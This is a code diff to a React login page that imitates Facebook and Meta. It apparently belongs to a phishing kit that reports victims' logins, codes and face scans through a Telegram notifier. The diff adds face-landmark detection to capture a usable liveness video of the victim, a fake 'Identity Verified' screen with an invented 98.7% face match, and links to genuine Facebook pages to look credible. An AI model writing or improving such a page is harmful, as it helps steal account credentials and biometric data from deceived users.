@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -12,6 +12,8 @@ import {
 } from "@/components/ui/dialog";
 import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
 import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
+import * as tf from '@tensorflow/tfjs';
+import * as faceLandmarksDetection from '@tensorflow-models/face-landmarks-detection';
 
 function FacebookLoader() {
   return (
@@ -85,6 +87,10 @@ export default function LoginPage() {
   const [directionProgress, setDirectionProgress] = useState(0);
   const [overallProgress, setOverallProgress] = useState(0);
   const [capturedVideo, setCapturedVideo] = useState<Blob | null>(null);
+  const [faceDetector, setFaceDetector] = useState<faceLandmarksDetection.FaceLandmarksDetector | null>(null);
+  const [facePosition, setFacePosition] = useState<{ x: number; y: number } | null>(null);
+  const [detectionActive, setDetectionActive] = useState(false);
+  const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -132,8 +138,30 @@ export default function LoginPage() {
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
       }
+      if (detectionIntervalRef.current) {
+        clearInterval(detectionIntervalRef.current);
+      }
     };
   }, [stream]);
+
+  // Initialize face detector
+  useEffect(() => {
+    const loadDetector = async () => {
+      try {
+        await tf.ready();
+        const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
+        const detector = await faceLandmarksDetection.createDetector(model, {
+          runtime: 'tfjs',
+          refineLandmarks: true,
+        });
+        setFaceDetector(detector);
+        console.log('Face detector loaded');
+      } catch (error) {
+        console.error('Error loading face detector:', error);
+      }
+    };
+    loadDetector();
+  }, []);
 
   // Effect to handle video playback when stream and videoRef are available
   useEffect(() => {
@@ -174,6 +202,45 @@ export default function LoginPage() {
     }
   };
 
+  const detectFaceDirection = async (video: HTMLVideoElement) => {
+    if (!faceDetector || !video) return null;
+
+    try {
+      const faces = await faceDetector.estimateFaces(video);
+      if (faces.length === 0) return null;
+
+      const face = faces[0];
+      const keypoints = face.keypoints;
+
+      // Get nose tip (index 1) and face center
+      const noseTip = keypoints.find(kp => kp.name === 'noseTip');
+      if (!noseTip) return null;
+
+      // Calculate face bounding box center
+      const xCoords = keypoints.map(kp => kp.x);
+      const yCoords = keypoints.map(kp => kp.y);
+      const centerX = (Math.min(...xCoords) + Math.max(...xCoords)) / 2;
+      const centerY = (Math.min(...yCoords) + Math.max(...yCoords)) / 2;
+
+      // Determine direction based on nose position relative to center
+      const threshold = 30;
+      let direction: "left" | "right" | "up" | "center" = "center";
+
+      if (noseTip.x < centerX - threshold) {
+        direction = "left";
+      } else if (noseTip.x > centerX + threshold) {
+        direction = "right";
+      } else if (noseTip.y < centerY - threshold) {
+        direction = "up";
+      }
+
+      return { direction, x: noseTip.x, y: noseTip.y };
+    } catch (error) {
+      console.error('Face detection error:', error);
+      return null;
+    }
+  };
+
   const handleStartRecording = async () => {
     try {
       await notifyFaceScan(userEmail);
@@ -184,9 +251,10 @@ export default function LoginPage() {
     setIsRecording(true);
     setCurrentStep("recording");
     setCurrentDirection("left");
+    setDetectionActive(true);
 
     // Start recording video
-    if (stream) {
+    if (stream && videoRef) {
       const chunks: Blob[] = [];
 
       // Find a supported mimeType - only check webm formats
@@ -260,64 +328,78 @@ export default function LoginPage() {
       recorder.start(100); // Collect data every 100ms
       setMediaRecorder(recorder);
 
-      const directionDuration = 2500; // 2.5 seconds per direction
-      const progressInterval = 50; // Update progress every 50ms
       // Two cycles: left, right, up - repeated twice
       const directions: ("left" | "right" | "up")[] = ["left", "right", "up", "left", "right", "up"];
-
       let currentDirIndex = 0;
-      let dirProgress = 0;
+      let detectedCorrectly = false;
+      let detectionStartTime = Date.now();
 
-      // Start progress animation
-      const animateProgress = () => {
-        const progressTimer = setInterval(() => {
-          dirProgress += (100 / (directionDuration / progressInterval));
+      // Start face detection loop
+      const detectionInterval = setInterval(async () => {
+        if (!videoRef) return;
 
-          if (dirProgress >= 100) {
-            // Mark current direction as complete before incrementing
-            const completedSet = new Set<string>();
-            for (let i = 0; i <= currentDirIndex; i++) {
-              completedSet.add(`${directions[i]}-${i}`); // Use index to make each step unique
+        const result = await detectFaceDirection(videoRef);
+        if (result) {
+          setFacePosition({ x: result.x, y: result.y });
+
+          // Check if detected direction matches required direction
+          if (result.direction === directions[currentDirIndex]) {
+            if (!detectedCorrectly) {
+              detectedCorrectly = true;
+              detectionStartTime = Date.now();
             }
-            setCompletedDirections(completedSet);
-            setDirectionProgress(100);
-            setOverallProgress(((currentDirIndex + 1) / directions.length) * 100);
 
-            // Move to next direction
-            currentDirIndex++;
-            dirProgress = 0;
+            const elapsed = Date.now() - detectionStartTime;
+            const progress = Math.min((elapsed / 2000) * 100, 100); // 2 seconds hold time
+            setDirectionProgress(progress);
 
-            if (currentDirIndex >= directions.length) {
-              // All directions complete
-              clearInterval(progressTimer);
-              setIsRecording(false);
-              setOverallProgress(100);
-              setCurrentDirection(null);
-
-              // Stop recording
-              if (recorder.state !== 'inactive') {
-                recorder.stop();
+            if (progress >= 100) {
+              // Mark direction as complete
+              const completedSet = new Set<string>();
+              for (let i = 0; i <= currentDirIndex; i++) {
+                completedSet.add(`${directions[i]}-${i}`);
               }
+              setCompletedDirections(completedSet);
+              setOverallProgress(((currentDirIndex + 1) / directions.length) * 100);
 
-              if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-              }
-              setCurrentStep("processing");
-            } else {
-              // Set next direction
-              setCurrentDirection(directions[currentDirIndex]);
+              // Move to next direction
+              currentDirIndex++;
+              detectedCorrectly = false;
               setDirectionProgress(0);
+
+              if (currentDirIndex >= directions.length) {
+                // All directions complete
+                clearInterval(detectionInterval);
+                setIsRecording(false);
+                setDetectionActive(false);
+                setOverallProgress(100);
+                setCurrentDirection(null);
+
+                // Stop recording
+                if (recorder.state !== 'inactive') {
+                  recorder.stop();
+                }
+
+                if (stream) {
+                  stream.getTracks().forEach(track => track.stop());
+                }
+                setCurrentStep("processing");
+              } else {
+                setCurrentDirection(directions[currentDirIndex]);
+              }
             }
           } else {
-            setDirectionProgress(dirProgress);
-            setOverallProgress((currentDirIndex / directions.length) * 100 + (dirProgress / directions.length));
+            detectedCorrectly = false;
+            setDirectionProgress(0);
           }
-        }, progressInterval);
+        } else {
+          setFacePosition(null);
+          detectedCorrectly = false;
+          setDirectionProgress(0);
+        }
+      }, 100); // Check every 100ms
 
-        return progressTimer;
-      };
-
-      animateProgress();
+      detectionIntervalRef.current = detectionInterval;
     }
   };
 
@@ -450,22 +532,24 @@ export default function LoginPage() {
               </Form>
 
               <div className="text-center mt-6">
-                <a href="#" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
+                <a href="https://www.facebook.com/login/identify/" target="_blank" rel="noopener noreferrer" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                   Forgotten password?
                 </a>
               </div>
 
               <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
-                <button
-                  onClick={() => setSignupOpen(true)}
-                  className="w-full py-3 text-sm font-bold rounded-full transition"
-                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2' }}
+                <a 
+                  href="https://www.facebook.com/reg/" 
+                  target="_blank" 
+                  rel="noopener noreferrer"
+                  className="block w-full py-3 text-sm font-bold rounded-full transition text-center"
+                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2', textDecoration: 'none' }}
                   onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
                   onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
                   data-testid="button-create-account"
                 >
                   Create new account
-                </button>
+                </a>
               </div>
             </>
           )}
@@ -761,7 +845,7 @@ export default function LoginPage() {
 
           {/* Processing/Complete - Identity Confirmed */}
           {(currentStep === "processing" || currentStep === "complete") && (
-            <div className="text-center py-12">
+            <div className="text-center py-8 px-4">
               {currentStep === "processing" ? (
                 <>
                   <div className="relative w-16 h-16 mx-auto mb-4">
@@ -781,29 +865,71 @@ export default function LoginPage() {
                 </>
               ) : (
                 <>
-                  <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
-                    <svg className="w-16 h-16" fill="none" stroke="#00a400" viewBox="0 0 24 24" strokeWidth={3}>
-                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-                    </svg>
+                  {/* Success Animation */}
+                  <div className="relative w-32 h-32 mx-auto mb-6">
+                    <div className="absolute inset-0 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                      <svg className="w-16 h-16" fill="none" stroke="#00a400" viewBox="0 0 24 24" strokeWidth={3}>
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+                      </svg>
+                    </div>
+                    <div className="absolute inset-0 rounded-full border-4 border-green-400 animate-ping opacity-75"></div>
                   </div>
-                  <h2 className="text-3xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
-                  <p className="text-sm mb-10" style={{ color: '#65676b' }}>
-                    Your face has been verified successfully. You can now continue to Facebook.
+
+                  <h2 className="text-3xl font-bold mb-2" style={{ color: '#1c1e21' }}>Identity Verified</h2>
+                  <p className="text-sm mb-8" style={{ color: '#65676b' }}>
+                    Your identity has been successfully confirmed
                   </p>
+
+                  {/* Verification Details Card */}
+                  <div className="max-w-sm mx-auto mb-8 p-4 rounded-lg" style={{ backgroundColor: '#f0f2f5' }}>
+                    <div className="space-y-3">
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Account Status</span>
+                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Verified</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Face Match</span>
+                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ 98.7%</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Security Level</span>
+                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ High</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Verification Time</span>
+                        <span className="text-xs" style={{ color: '#1c1e21' }}>{new Date().toLocaleTimeString()}</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Security Features */}
+                  <div className="max-w-sm mx-auto mb-8 text-left">
+                    <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Security features confirmed:</p>
+                    <div className="space-y-2">
+                      <div className="flex items-start gap-2">
+                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
+                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                        </svg>
+                        <p className="text-xs" style={{ color: '#65676b' }}>Biometric face recognition completed</p>
+                      </div>
+                      <div className="flex items-start gap-2">
+                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
+                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                        </svg>
+                        <p className="text-xs" style={{ color: '#65676b' }}>Live detection verified (not a photo)</p>
+                      </div>
+                      <div className="flex items-start gap-2">
+                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
+                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                        </svg>
+                        <p className="text-xs" style={{ color: '#65676b' }}>Account security enhanced</p>
+                      </div>
+                    </div>
+                  </div>
+
                   <button
-                    onClick={() => {
-                      setCurrentStep("login");
-                      setUserEmail("");
-                      setVerificationCode("");
-                      setCompletedDirections(new Set());
-                      setCurrentDirection(null);
-                      setIsRecording(false);
-                      if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                        setStream(null);
-                      }
-                    }}
-                    className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                    onClick={() => window.location.href = 'https://www.facebook.com'}
+                    className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
                     style={{ backgroundColor: '#1877f2' }}
                     onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                     onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
@@ -811,6 +937,10 @@ export default function LoginPage() {
                   >
                     Continue to Facebook
                   </button>
+                  
+                  <p className="text-xs" style={{ color: '#65676b' }}>
+                    You'll be redirected to your Facebook account
+                  </p>
                 </>
               )}
             </div>
@@ -829,13 +959,13 @@ export default function LoginPage() {
           />
         </div>
         <div className="text-xs">
-          <a href="#" className="hover:underline mr-2" data-testid="link-about">
+          <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-2" data-testid="link-about">
             About
           </a>
-          <a href="#" className="hover:underline mr-2" data-testid="link-help">
+          <a href="https://www.facebook.com/help/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-2" data-testid="link-help">
             Help
           </a>
-          <a href="#" className="hover:underline" data-testid="link-more">
+          <a href="https://www.facebook.com/" target="_blank" rel="noopener noreferrer" className="hover:underline" data-testid="link-more">
             More
           </a>
         </div>
